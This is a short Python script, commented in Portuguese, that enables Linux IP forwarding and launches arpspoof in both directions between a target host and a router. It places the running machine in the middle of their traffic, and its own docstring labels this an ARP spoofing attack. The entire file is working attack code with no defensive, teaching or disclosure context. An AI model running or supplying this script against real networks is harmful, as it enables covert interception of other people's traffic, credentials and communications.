import os
import subprocess

def enable_ip_forwarding():
    """Habilita o IP Forwarding no Linux."""
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("IP Forwarding habilitado.")

def run_arpspoof(interface, target_ip, router_ip):
    """Executa o ataque ARP Spoofing."""
    print(f"Iniciando ataque ARP Spoofing entre {target_ip} e {router_ip}...")
    subprocess.Popen(["arpspoof", "-i", interface, "-t", target_ip, router_ip])
    subprocess.Popen(["arpspoof", "-i", interface, "-t", router_ip, target_ip])

# Teste
if __name__ == "__main__":
    enable_ip_forwarding()
    run_arpspoof("eth0", "192.168.1.100", "192.168.1.1")
